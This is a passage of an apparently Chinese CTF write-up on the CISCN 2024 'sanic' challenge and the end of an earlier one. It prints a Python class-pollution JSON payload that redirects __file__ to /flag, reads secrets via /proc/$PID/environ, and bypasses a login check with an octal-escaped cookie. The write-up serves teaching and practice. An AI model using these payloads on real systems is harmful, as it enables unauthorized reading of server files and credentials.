<p><img data-src="https://i-blog.csdnimg.cn/direct/283dc0e8e2fa4c809e8dd7356a9cfe04.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		但是，上传却失败了？（这儿可能会出现两个问题，除了黑名单本身的问题外，还有个重点问题，也会导致失败，就是一定要把 Content-Type 修改为<strong> application/json</strong>）看看这儿：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br></pre></td></tr></table></figure>
<p>​		虽然挺明显的，但还是很阴。很显然，在 check 函数下，有个与黑名单的比较，推测应该是这儿过不了，不过，当我们依次把那几个变量修改一下之后，发现，当 <code>__init__</code> 被修改成 <code>__int__</code> 后，返回的是 Register Success，所以，这里似乎只需要绕过 <code>__init__</code> 就行了，先做如下测试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(a.__class__.check.__globals__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x00000122A3EB56D0&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;D:\\html study\\PyCharm Project\\flask_pydash1\\test.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;A&#x27;: &lt;class &#x27;__main__.A&#x27;&gt;, &#x27;a&#x27;: &lt;__main__.A object at 0x00000122A405FA50&gt;&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		发现我们可以通过对象的方法来获取 <code>__globals__</code> 全局变量，所以 payload 可以如下构造：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;b&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__class__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;check&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__file__&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/flag&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​		但是最后读取根路由的时候出现了哥问题，那就是，flag 文件名不对。</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/f39a01d5d0ed4bbaac39251c83970cdc.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		令人窒息的操作。不过有一点儿或许有点儿希望，那就是环境变量，如果环境变量里面也没有的话，那我可就真没法了，说干就干，首先，环境变量可以通过  <code>/proc/$PID/environ</code>  来读取，这里推测有可能需要用到爆破。</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/5d2180dbf885469a822d061ec3e4c913.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		之后读取根路由：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/dfd34f6d7e2f4a6bbdbbe3c0491905c5.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		运气好，flag 刚好就在环境变量里。flag 如下：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1084bd02-8273-4a0b-a490-08451805df3a&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ciscn2024-初赛-sanic"><a class="markdownIt-Anchor" href="#ciscn2024-初赛-sanic">#</a> [Ciscn2024 初赛] sanic</h2>
<p>​		根路由提示： where is my flag?，f12 后发现提示了 /src 路由，访问后获得源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>​		初步审一下逻辑，有用的信息如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br></pre></td></tr></table></figure>
<p>​		一眼看上去没什么，但是和下面这个结合起来就不一样了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>​		在 admin 这个路由中，可以清晰地看到 pydash.set_() 函数，结合上一个信息，应该是打 python 的原型链污染 <code>__file__</code> 来读文件，那么，还有个路由需要注意：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>​		这里可以发现的是，我们需要传入一个 Cookie 的值为 user=adm;n 才行，但是，试过了，不行，为啥呢？</p>
<p><strong>注意：以下为我个人分析方式，由于我本人异常菜鸡，所以很有可能是错误的，不可盲目相信。</strong></p>
<p>​		然后我们盯住 <code>user = request.cookies.get(&quot;user&quot;)</code>  这一行代码，对着 cookie 同时按住 ctrl + 左键，找到这一行内容，跟进：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/334caff31c114d5da4c4fd89b1523085.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		发现如下源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@property</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookies</span>(<span class="params">self</span>) -&gt; RequestParameters:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Incoming cookies on the request</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        RequestParameters: Incoming cookies on the request</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.parsed_cookies <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        self.get_cookies()</span><br><span class="line">    <span class="keyword">return</span> cast(CookieRequestParameters, self.parsed_cookies)</span><br></pre></td></tr></table></figure>
<p>​		跟进  <code>get_cookies()</code> ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookies</span>(<span class="params">self</span>) -&gt; RequestParameters:</span><br><span class="line">    cookie = self.headers.getone(<span class="string">&quot;cookie&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    self.parsed_cookies = CookieRequestParameters(parse_cookie(cookie))</span><br><span class="line">    <span class="keyword">return</span> self.parsed_cookies</span><br></pre></td></tr></table></figure>
<p>​		这里审过前面那个对象，重要程度没有再跟进 <code>parse_cookie(cookie)</code>  高，所以跟进 <code>parse_cookie(cookie)</code> ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">raw: <span class="built_in">str</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parses a raw cookie string into a dictionary.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The function takes a raw cookie string (usually from HTTP headers) and</span></span><br><span class="line"><span class="string">    returns a dictionary where each key is a cookie name and the value is a</span></span><br><span class="line"><span class="string">    list of values for that cookie. The function handles quoted values and</span></span><br><span class="line"><span class="string">    skips invalid cookie names.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        raw (str): The raw cookie string to be parsed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        Dict[str, List[str]]: A dictionary containing the cookie names as keys</span></span><br><span class="line"><span class="string">        and a list of values for each cookie.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string">        ```python</span></span><br><span class="line"><span class="string">        raw = &#x27;name1=value1; name2=&quot;value2&quot;; name3=value3&#x27;</span></span><br><span class="line"><span class="string">        cookies = parse_cookie(raw)</span></span><br><span class="line"><span class="string">        # cookies will be &#123;&#x27;name1&#x27;: [&#x27;value1&#x27;], &#x27;name2&#x27;: [&#x27;value2&#x27;], &#x27;name3&#x27;: [&#x27;value3&#x27;]&#125;</span></span><br></pre></td></tr></table></figure>
<pre><code>&quot;&quot;&quot;  # noqa: E501
cookies: Dict[str, List[str]] = &#123;&#125;

for token in raw.split(&quot;;&quot;):
    name, sep, value = token.partition(&quot;=&quot;)
    name = name.strip()
    value = value.strip()

    # Support cookies =value or plain value with no name
    # https://github.com/httpwg/http-extensions/issues/159
    if not sep:
        if not name:
            # Empty value like ;; or a cookie header with no value
            continue
        name, value = &quot;&quot;, name

    if COOKIE_NAME_RESERVED_CHARS.search(name):  # no cov
        continue

    if len(value) &gt; 2 and value[0] == '&quot;' and value[-1] == '&quot;':  # no cov
        value = _unquote(value)

    if name in cookies:
        cookies[name].append(value)
    else:
        cookies[name] = [value]

return cookies
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​		这里有一点需要注意：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"> for token in raw.split(&quot;;&quot;):</span><br><span class="line">        name, sep, value = token.partition(&quot;=&quot;)</span><br><span class="line">        name = name.strip()</span><br><span class="line">        value = value.strip()</span><br></pre></td></tr></table></figure>
<p>​		这个代码很显然是将分号前后分割成了两个字符串，也就是说，我们想要输入的 Cookie: user=adm;n 会变成 user=adm 以及 n 这两个串。</p>
<p>​		根据这几行，大概可以发现最后返回的内容和什么有关了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">2</span> <span class="keyword">and</span> value[<span class="number">0</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> value[-<span class="number">1</span>] == <span class="string">&#x27;&quot;&#x27;</span>:  <span class="comment"># no cov</span></span><br><span class="line">        value = _unquote(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> cookies:</span><br><span class="line">        cookies[name].append(value)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cookies[name] = [value]</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cookies</span><br></pre></td></tr></table></figure>
<p>​		很明显，最终返回的是 cookies ，但是每次操作 cookies 都是增加的 value 参数，由此，根据  <code>value = _unquote(value)</code> ，这里跟进 <code>_unquote(value)</code> ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_unquote</span>(<span class="params"><span class="built_in">str</span></span>):  <span class="comment"># no cov</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>[<span class="number">0</span>] != <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">or</span> <span class="built_in">str</span>[-<span class="number">1</span>] != <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">str</span> = <span class="built_in">str</span>[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    n = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt;= i &lt; n:</span><br><span class="line">        o_match = OCTAL_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">        q_match = QUOTE_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> o_match <span class="keyword">and</span> <span class="keyword">not</span> q_match:</span><br><span class="line">            res.append(<span class="built_in">str</span>[i:])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        j = k = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> o_match:</span><br><span class="line">            j = o_match.start(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> q_match:</span><br><span class="line">            k = q_match.start(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> q_match <span class="keyword">and</span> (<span class="keyword">not</span> o_match <span class="keyword">or</span> k &lt; j):</span><br><span class="line">            res.append(<span class="built_in">str</span>[i:k])</span><br><span class="line">            res.append(<span class="built_in">str</span>[k + <span class="number">1</span>])</span><br><span class="line">            i = k + <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(<span class="built_in">str</span>[i:j])</span><br><span class="line">            res.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>[j + <span class="number">1</span> : j + <span class="number">4</span>], <span class="number">8</span>)))  <span class="comment"># noqa: E203</span></span><br><span class="line">            i = j + <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(res)</span><br></pre></td></tr></table></figure>
<p>​		感觉，这个就是我们最主要的利用的点。</p>
<p>​		首先是这几行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">str</span>[<span class="number">0</span>] != <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">or</span> <span class="built_in">str</span>[-<span class="number">1</span>] != <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">str</span>[<span class="number">1</span>:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>​		判断传入的字符串（这里推测是 user=XXXX 中的 XXXX），发现如果第一个字符不是两种引号，则直接返回，如果是引号，则掐头去尾，把引号去掉。之后的代码我不大会审，跑去问了下 AI，可能有点儿智障，不过给了我一个方向，测试了一下，能成：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">n = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span> &lt;= i &lt; n:</span><br><span class="line">    o_match = OCTAL_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">    q_match = QUOTE_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> o_match <span class="keyword">and</span> <span class="keyword">not</span> q_match:</span><br><span class="line">        res.append(<span class="built_in">str</span>[i:])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    j = k = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> o_match:</span><br><span class="line">        j = o_match.start(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> q_match:</span><br><span class="line">        k = q_match.start(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> q_match <span class="keyword">and</span> (<span class="keyword">not</span> o_match <span class="keyword">or</span> k &lt; j):</span><br><span class="line">        res.append(<span class="built_in">str</span>[i:k])</span><br><span class="line">        res.append(<span class="built_in">str</span>[k + <span class="number">1</span>])</span><br><span class="line">        i = k + <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res.append(<span class="built_in">str</span>[i:j])</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>[j + <span class="number">1</span> : j + <span class="number">4</span>], <span class="number">8</span>)))  <span class="comment"># noqa: E203</span></span><br><span class="line">        i = j + <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://i-blog.csdnimg.cn/direct/b7ed96c33d6c4f9fa6d71c7b2a5a49d5.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		后面还给了个它给写的改进的代码，不过就不放这儿了。</p>
<p>​		根据这个答案猜想，可能是通过八进制进行的绕过，测试一下，访问下 login 路由，然后修改 cookie 的值为 <code>Cookie: user=&quot;adm\073n&quot;</code> ，之后试试看能否登陆成功？</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/545cfa811fea45829bf35e9fb54f09c0.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		成功了 <strong>(≧▽≦)o</strong>。</p>
<p>​		这里它返回了个 Session 值，然后将它给的 Session 值写到请求头内，然后访问 admin 路由，发现并没有 给我们直接 forbidden 掉，说明成功了。之后就是正儿八经的原型链污染读文件了，第一波，先读一下，先来个第一个 payload：</p>
